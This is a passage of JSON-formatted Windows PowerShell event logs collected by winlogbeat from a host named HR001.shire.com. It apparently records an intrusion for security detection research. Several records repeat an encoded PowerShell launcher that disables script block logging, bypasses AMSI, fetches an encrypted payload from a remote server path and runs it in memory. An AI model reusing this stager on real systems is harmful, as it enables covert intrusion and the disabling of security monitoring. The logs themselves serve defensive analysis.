IABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = ForEach-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71027\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell","Payload":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$508c.Headers.Add($_.Name, $_.Value)\""},"process_id":5452,"message":"CommandInvocation(ForEach-Object): \"ForEach-Object\"\nParameterBinding(ForEach-Object): name=\"Process\"; value=\"$508c.Headers.Add($_.Name, $_.Value)\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = ForEach-Object\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71027\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:","thread_id":3896,"record_number":"92780","activity_id":"{c93a7728-017f-0000-c602-4aca7f01d501}"}
{"@timestamp":"2019-05-18T20:43:09.237Z","@metadata":{"beat":"winlogbeat","type":"doc","version":"6.7.0","topic":"winlogbeat"},"thread_id":3896,"log_name":"Microsoft-Windows-PowerShell/Operational","host":{"name":"WECserver"},"version":1,"task":"Executing Pipeline","computer_name":"HR001.shire.com","beat":{"name":"WECserver","hostname":"WECserver","version":"6.7.0"},"activity_id":"{c93a7728-017f-0000-c702-4aca7f01d501}","source_name":"Microsoft-Windows-PowerShell","message":"CommandInvocation(Get-Random): \"Get-Random\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/admin/get.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/news.php\"\nParameterBinding(Get-Random): name=\"InputObject\"; value=\"/login/process.php\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBDAGsAXQAuACIARwBlAHQARgBJAGUAYABMAGQAIgAoACcAcwBpAGcAbgBhAHQAdQByAGUAcwAnACwAJwBOACcAKwAnAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQB0AFYAQQBMAHUARQAoACQAbgBVAEwAbAAsACgATgBFAHcALQBPAEIASgBlAEMAVAAgAEMAbwBMAGwARQBjAFQAaQBPAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBIAGEAcwBIAFMARQBUAFsAUwBUAHIAaQBOAGcAXQApACkAfQAkAFIAZQBGAD0AWwBSAEUAZgBdAC4AQQBzAFMAZQBNAGIATABZAC4ARwBlAFQAVABZAHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAVABGAEkARQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AFYAQQBsAFUARQAoACQAbgBVAGwATAAsACQAVABSAFUAZQApADsAfQA7AFsAUwBZAHMAVABlAE0ALgBOAEUAdAAuAFMARQByAFYASQBDAEUAUABvAEkATgBUAE0AYQBuAEEARwBlAHIAXQA6ADoARQB4AHAARQBjAFQAMQAwADAAQwBvAE4AVABJAE4AdQBlAD0AMAA7ACQANQAwADgAYwA9AE4AZQBXAC0ATwBCAGoAZQBDAHQAIABTAHkAcwBUAGUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAGkARQBuAFQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQANQAwADgAQwAuAEgAZQBBAGQARQByAFMALgBBAEQAZAAoACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnACwAJAB1ACkAOwAkADUAMAA4AGMALgBIAGUAYQBEAEUAcgBzAC4AQQBkAEQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJAA1ADAAOABjAC4AUAByAG8AeAB5AD0AWwBTAHkAcwB0AEUAbQAuAE4AZQB0AC4AVwBlAEIAUgBlAHEAVQBFAHMAVABdADoAOgBEAGUAZgBhAHUAbAB0AFcARQBCAFAAUgBvAFgAWQA7ACQANQAwADgAYwAuAFAAcgBPAHgAWQAuAEMAUgBFAEQARQBuAFQAaQBBAGwAcwAgAD0AIABbAFMAeQBzAHQAZQBNAC4ATgBFAFQALgBDAHIAZQBkAEUAbgBUAEkAQQBsAEMAQQBjAEgAZQBdADoAOgBEAEUARgBhAHUATABUAE4ARQBUAHcAbwBSAEsAQwByAEUAZABlAE4AVABJAEEAbABTADsAJABTAGMAcgBpAHAAdAA6AFAAcgBvAHgAeQAgAD0AIAAkADUAMAA4AGMALgBQAHIAbwB4AHkAOwAkAEsAPQBbAFMAWQBTAHQAZQBNAC4AVABFAFgAdAAuAEUATgBDAG8ARABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAVABCAFkAVABFAFMAKAAnAH4AawAqAF8ARgBTAGoAcgA4ACUAeAB3AGUASgA2AGgAfABQAEsALgBmAHsAVQBOAE0ASAB1AGQAcAA1AHkAbQAnACkAOwAkAFIAPQB7ACQARAAsACQASwA9ACQAQQByAEcAcwA7ACQAUwA9ADAALgAuADIANQA1ADsAMAAuAC4AMgA1ADUAfAAlAHsAJABKAD0AKAAkAEoAKwAkAFMAWwAkAF8AXQArACQASwBbACQAXwAlACQASwAuAEMAbwB1AE4AdABdACkAJQAyADUANgA7ACQAUwBbACQAXwBdACwAJABTAFsAJABKAF0APQAkAFMAWwAkAEoAXQAsACQAUwBbACQAXwBdAH0AOwAkAEQAfAAlAHsAJABJAD0AKAAkAEkAKwAxACkAJQAyADUANgA7ACQASAA9ACgAJABIACsAJABTAFsAJABJAF0AKQAlADIANQA2ADsAJABTAFsAJABJAF0ALAAkAFMAWwAkAEgAXQA9ACQAUwBbACQASABdACwAJABTAFsAJABJAF0AOwAkAF8ALQBCAFgAbwBSACQAUwBbACgAJABTAFsAJABJAF0AKwAkAFMAWwAkAEgAXQApACUAMgA1ADYAXQB9AH0AOwAkAHMAZQByAD0AJAAoAFsAVABlAHgAVAAuAEUATgBjAG8ARABJAG4ARwBdADoAOgBVAG4AaQBjAG8ARABFAC4ARwBFAHQAUwBUAFIASQBOAEcAKABbAEMATwBOAHYARQByAHQAXQA6ADoARgByAE8ATQBCAEEAUwBlADYANABTAFQAUgBpAG4AZwAoACcAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARABFAEEATQBBAEEAdQBBAEQAQQBBAEwAZwBBAHgAQQBEAEEAQQBMAGcAQQB4AEEARABBAEEATgBnAEEAPQAnACkAKQApADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJAA1ADAAOABjAC4ASABlAGEAZABFAHIAUwAuAEEAZABkACgAIgBDAG8AbwBrAGkAZQAiACwAIgBIAFkAdgBsAFAASgBNAG0AcwBrAHkATgBGAFQAawA9AGkAKwBjAHMANQBCAFAARwBjAGEAUgBJAFAAWgA1AGcAMgBOAEQATQBtADUAUQBZAGoAVQBrAD0AIgApADsAJABEAGEAVABhAD0AJAA1ADAAOABjAC4ARABvAFcAbgBsAG8AQQBEAEQAQQB0AEEAKAAkAHMAZQByACsAJAB0ACkAOwAkAGkAVgA9ACQAZABhAHQAQQBbADAALgAuADMAXQA7ACQARABBAFQAQQA9ACQAZABBAHQAQQBbADQALgAuACQARABhAHQAQQAuAEwARQBOAEcAVABoAF0AOwAtAEoAbwBJAG4AWwBDAEgAYQByAFsAXQBdACgAJgAgACQAUgAgACQAZABBAHQAYQAgACgAJABJAFYAKwAkAEsAKQApAHwASQBFAFgA\n        Engine Version = 5.1.17763.316\n        Runspace ID = 5394f09a-82e8-432b-a847-ed46ac75eed1\n        Pipeline ID = 1\n        Command Name = Get-Random\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 71029\n        User = SHIRE\\nmartha\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:","event_id":4103,"level":"Information","type":"wineventlog","event_data":{"ContextInfo":"        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.17763.316\n        Host ID = 76b548b3-2221-41d9-8e53-ad5dff2c5c4e\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -noP -sta -w 1 -enc SQBmACgAJABQAFMAVgBFAHIAUwBpAE8AbgBUAEEAQgBsAEUALgBQAFMAVgBlAHIAcwBJAE8ATgAuAE0AQQBqAG8AcgAgAC0AZwBFACAAMwApAHsAJAAyADQAMQBmAD0AWwByAEUAZgBdAC4AQQBzAHMAZQBtAEIATAB5AC4ARwBlAHQAVABZAHAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFUAdABpAGwAcwAnACkALgAiAEcARQBUAEYASQBFAGAATABkACIAKAAnAGMAYQBjAGgAZQBkAEcAcgBvAHUAcABQAG8AbABpAGMAeQBTAGUAdAB0AGkAbgBnAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwBJAEYAKAAkADIANAAxAEYAKQB7ACQARgAwADkAQQA9ACQAMgA0ADEAZgAuAEcARQB0AFYAQQBMAHUAZQAoACQATgB1AEwATAApADsASQBGACgAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARgAwADkAQQBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0APQAwADsAJABmADAAOQBhAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AWwAnAEUAbgBhAGIAbABlAFMAYwByAGkAcAB0AEIAbABvAGMAawBJAG4AdgBvAGMAYQB0AGkAbwBuAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAB9ACQAdgBhAEwAPQBbAEMATwBsAGwARQBjAHQASQBPAG4AUwAuAEcAZQBOAGUAUgBJAGMALgBEAEkAQwBUAEkATwBOAGEAcgB5AFsAUwBUAFIAaQBOAEcALABTAFkAcwB0AGUAbQAuAE8AQgBKAEUAYwB0AF0AXQA6ADoAbgBFAHcAKAApADsAJABWAEEAbAAuAEEAZABEACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnACwAMAApADsAJAB2AGEAbAAuAEEAZABkACgAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcALAAwACkAOwAkAGYAMAA5AGEAWwAnAEgASwBFAFkAXwBMAE8AQwBBAEwAXwBNAEEAQwBIAEkATgBFAFwAUwBvAGYAdAB3AGEAcgBlAFwAUABvAGwAaQBjAGkAZQBzAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAUABvAHcAZQByAFMAaABlAGwAbABcAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQA9ACQAdgBBAEwAfQBFAEwAUwBlAHsAWwBTAEMAcgBJAHAAdABCAGwATwBD